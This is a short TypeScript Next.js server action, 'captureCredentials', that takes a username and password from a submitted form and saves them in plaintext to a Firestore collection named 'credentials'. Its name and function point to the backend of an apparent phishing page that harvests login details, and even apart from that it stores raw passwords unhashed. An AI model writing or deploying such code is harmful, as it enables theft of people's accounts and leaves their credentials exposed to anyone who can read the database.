'use server';

import { initializeFirebaseServer } from '@/firebase/server';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';

export async function captureCredentials(prevState: any, formData: FormData) {
  const username = formData.get('username') as string;
  const password = formData.get('password') as string;

  if (!username || !password) {
    return { success: false, message: 'Invalid input.' };
  }

  try {
    const { firestore } = initializeFirebaseServer();
    const credentialsCollection = collection(firestore, 'credentials');

    await addDoc(credentialsCollection, {
      username,
      password,
      createdAt: serverTimestamp(),
    });

    return { success: true };
  } catch (error: any) {
    console.error('Error saving credentials to Firestore:', error);
    return {
      success: false,
      message: 'Failed to save credentials. Please check server logs and Firestore rules.',
    };
  }
}
